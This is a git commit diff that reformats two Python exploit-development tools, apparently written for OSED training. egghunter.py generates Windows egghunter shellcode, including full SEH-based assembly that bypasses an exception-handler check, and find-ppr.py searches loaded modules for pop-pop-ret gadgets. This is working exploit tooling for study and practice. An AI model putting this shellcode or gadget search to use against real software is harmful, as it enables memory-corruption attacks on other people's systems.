0c1f5f5aefdc6bb4399099a5baaca0455d98513e
Ben "epi" Risher <epibar052@gmail.com>
2021-05-01 06:31:30 -0500

    formatted with black

--- egghunter.py
+++ egghunter.py
@@ -3,11 +3,13 @@ import sys
 import argparse
 import keystone as ks
 
+
 def tag_to_hex(s):
     retval = list()
     for char in s:
-        retval.append(hex(ord(char)).replace('0x', ''))
-    return '0x' + ''.join(retval[::-1])
+        retval.append(hex(ord(char)).replace("0x", ""))
+    return "0x" + "".join(retval[::-1])
+
 
 def ntaccess_hunter(tag):
     asm = f"""
@@ -37,48 +39,50 @@ def ntaccess_hunter(tag):
     """
     return asm
 
+
 def seh_hunter(tag):
     asm = [
-        'start:',
-            'jmp get_seh_address',              # start of jmp/call/pop
-        'build_exception_record:',
-            'pop ecx',                          # address of exception_handler
-            f'mov eax, {tag_to_hex(tag)}',      # tag into eax
-            'push ecx',                         # push Handler of the _EXCEPTION_REGISTRATION_RECORD structure
-            'push 0xffffffff',                  # push Next of the _EXCEPTION_REGISTRATION_RECORD structure
-            'xor ebx, ebx',
-            'mov dword ptr fs:[ebx], esp',      # overwrite ExceptionList in the TEB with a pointer to our new _EXCEPTION_REGISTRATION_RECORD structure
-            # bypass RtlIsValidHandler's StackBase check by placing the memory address of our _except_handler function at a higher address than the StackBase.
-            'sub ecx, 0x04',                    # substract 0x04 from the pointer to exception_handler
-            'add ebx, 0x04',                    # add 0x04 to ebx
-            'mov dword ptr fs:[ebx], ecx',      # overwrite the StackBase in the TEB
-        'is_egg:',
-            'push 0x02',
-            'pop ecx',                          # load 2 into counter
-            'mov edi, ebx',                     # move memory page address into edi
-            'repe scasd',                       # check for tag, if the page is invalid we trigger an exception and jump to our exception_handler function
-            'jnz loop_inc_one',                 # didn't find signature, increase ebx and repeat
-            'jmp edi',                          # found the tag
-        'loop_inc_page:',
-            'or bx, 0xfff',                     # if page is invalid the exception_handler will update eip to point here and we move to next page
-        'loop_inc_one:',
-            'inc ebx',                          # increase memory page address by a byte
-            'jmp is_egg',                       # check for the tag again
-        'get_seh_address:',
-            'call build_exception_record',      # call portion of jmp/call/pop
-            'push 0x0c',
-            'pop ecx',                          # store 0x0c in ecx to use as an offset
-            'mov eax, [esp+ecx]',               # mov into eax the pointer to the CONTEXT structure for our exception
-            'mov cl, 0xb8',                     # mov 0xb8 into ecx which will act as an offset to the eip
-            # increase the value of eip by 0x06 in our CONTEXT so it points to the "or bx, 0xfff" instruction to increase the memory page
-            'add dword ptr ds:[eax+ecx], 0x06', 
-            'pop eax',                          # save return address in eax
-            'add esp, 0x10',                    # increase esp to clean the stack for our call 
-            'push eax',                         # push return value back into the stack
-            'xor eax, eax',                     # null out eax to simulate ExceptionContinueExecution return
-            'ret',
+        "start:",
+        "jmp get_seh_address",  # start of jmp/call/pop
+        "build_exception_record:",
+        "pop ecx",  # address of exception_handler
+        f"mov eax, {tag_to_hex(tag)}",  # tag into eax
+        "push ecx",  # push Handler of the _EXCEPTION_REGISTRATION_RECORD structure
+        "push 0xffffffff",  # push Next of the _EXCEPTION_REGISTRATION_RECORD structure
+        "xor ebx, ebx",
+        "mov dword ptr fs:[ebx], esp",  # overwrite ExceptionList in the TEB with a pointer to our new _EXCEPTION_REGISTRATION_RECORD structure
+        # bypass RtlIsValidHandler's StackBase check by placing the memory address of our _except_handler function at a higher address than the StackBase.
+        "sub ecx, 0x04",  # substract 0x04 from the pointer to exception_handler
+        "add ebx, 0x04",  # add 0x04 to ebx
+        "mov dword ptr fs:[ebx], ecx",  # overwrite the StackBase in the TEB
+        "is_egg:",
+        "push 0x02",
+        "pop ecx",  # load 2 into counter
+        "mov edi, ebx",  # move memory page address into edi
+        "repe scasd",  # check for tag, if the page is invalid we trigger an exception and jump to our exception_handler function
+        "jnz loop_inc_one",  # didn't find signature, increase ebx and repeat
+        "jmp edi",  # found the tag
+        "loop_inc_page:",
+        "or bx, 0xfff",  # if page is invalid the exception_handler will update eip to point here and we move to next page
+        "loop_inc_one:",
+        "inc ebx",  # increase memory page address by a byte
+        "jmp is_egg",  # check for the tag again
+        "get_seh_address:",
+        "call build_exception_record",  # call portion of jmp/call/pop
+        "push 0x0c",
+        "pop ecx",  # store 0x0c in ecx to use as an offset
+        "mov eax, [esp+ecx]",  # mov into eax the pointer to the CONTEXT structure for our exception
+        "mov cl, 0xb8",  # mov 0xb8 into ecx which will act as an offset to the eip
+        # increase the value of eip by 0x06 in our CONTEXT so it points to the "or bx, 0xfff" instruction to increase the memory page
+        "add dword ptr ds:[eax+ecx], 0x06",
+        "pop eax",  # save return address in eax
+        "add esp, 0x10",  # increase esp to clean the stack for our call
+        "push eax",  # push return value back into the stack
+        "xor eax, eax",  # null out eax to simulate ExceptionContinueExecution return
+        "ret",
     ]
-    return '\n'.join(asm)
+    return "\n".join(asm)
+
 
 def main(args):
 
@@ -102,23 +106,42 @@ def main(args):
         if bad in final:
             print(f"[!] Found 0x{bad}")
             sentry = True
-    
+
     if sentry:
-        print(f'[=] {final[14:-1]}', file=sys.stderr)
+        print(f"[=] {final[14:-1]}", file=sys.stderr)
         raise SystemExit("[!] Remove bad characters and try again")
-    
+
     print(f"[+] egghunter created!")
     print(f"[=]   len: {len(encoding)} bytes")
     print(f"[=]   tag: {args.tag * 2}")
     print(f"[=]   ver: {['NtAccessCheckAndAuditAlarm', 'SEH'][args.seh]}\n")
     print(final)
 
-if __name__ == '__main__':
-    parser = argparse.ArgumentParser(description='Creates an egghunter compatible with the OSED lab VM')
-    
-    parser.add_argument('-t', '--tag', help='tag for which the egghunter will search (default: c0d3)', default='c0d3')
-    parser.add_argument('-b', '--bad-chars', help='space separated list of bad chars to check for in final egghunter (default: 00)', default=['00'], nargs='+')
-    parser.add_argument('-s', '--seh', help='create an seh based egghunter instead of NtAccessCheckAndAuditAlarm', action='store_true')
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(
+        description="Creates an egghunter compatible with the OSED lab VM"
+    )
+
+    parser.add_argument(
+        "-t",
+        "--tag",
+        help="tag for which the egghunter will search (default: c0d3)",
+        default="c0d3",
+    )
+    parser.add_argument(
+        "-b",
+        "--bad-chars",
+        help="space separated list of bad chars to check for in final egghunter (default: 00)",
+        default=["00"],
+        nargs="+",
+    )
+    parser.add_argument(
+        "-s",
+        "--seh",
+        help="create an seh based egghunter instead of NtAccessCheckAndAuditAlarm",
+        action="store_true",
+    )
 
     args = parser.parse_args()
 
--- find-ppr.py
+++ find-ppr.py
@@ -2,10 +2,11 @@ import pykd
 import argparse
 from enum import Enum, auto
 
+
 class Module:
     # 00400000 00465000   diskpls    (deferred)
     def __init__(self, unparsed):
-        self.name = 'unknown'
+        self.name = "unknown"
         self.start = -1
         self.end = -1
         self.unparsed = unparsed.split()
@@ -18,7 +19,8 @@ class Module:
             self.name = self.unparsed[2]
 
     def __str__(self):
-        return f'{self.name}(start={self.start}, end={self.end})'
+        return f"{self.name}(start={self.start}, end={self.end})"
+
 
 class PopR32(Enum):
     eax = 0x58
@@ -29,8 +31,9 @@ class PopR32(Enum):
     esi = auto()
     edi = auto()
 
+
 def main(args):
-    modules = pykd.dbgCommand('lm')
+    modules = pykd.dbgCommand("lm")
 
     for mod_line in modules.splitlines():
         module = Module(mod_line)
@@ -38,29 +41,35 @@ def main(args):
         if module.name.lower() not in [mod.lower() for mod in args.modules]:
             continue
 
-        print(f'[+] searching {module.name} for pop r32; pop r32; ret')
+        print(f"[+] searching {module.name} for pop r32; pop r32; ret")
 
         for pop1 in range(0x58, 0x60):
 
             for pop2 in range(0x58, 0x60):
-                command = f's-[1]b {module.start} {module.end} {hex(pop1)} {hex(pop2)} c3'
+                command = (
+                    f"s-[1]b {module.start} {module.end} {hex(pop1)} {hex(pop2)} c3"
+                )
                 result = pykd.dbgCommand(command)
-                
-                
+
                 if result is None:
                     continue
 
                 for addr in result.splitlines():
                     try:
-                        print(f'[+] {module.name}::{addr}: pop {PopR32(pop1).name}; pop {PopR32(pop2).name}; ret')
+                        print(
+                            f"[+] {module.name}::{addr}: pop {PopR32(pop1).name}; pop {PopR32(pop2).name}; ret"
+                        )
                     except ValueError:
                         # not a valid pop r32
                         pass
 
 
-
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
-    parser.add_argument('modules', help='module name(s) to search for pop pop ret (ex: find-ppr.py libspp diskpls libpal)', nargs='+')
+    parser.add_argument(
+        "modules",
+        help="module name(s) to search for pop pop ret (ex: find-ppr.py libspp diskpls libpal)",
+        nargs="+",
+    )
     args = parser.parse_args()
     main(args)
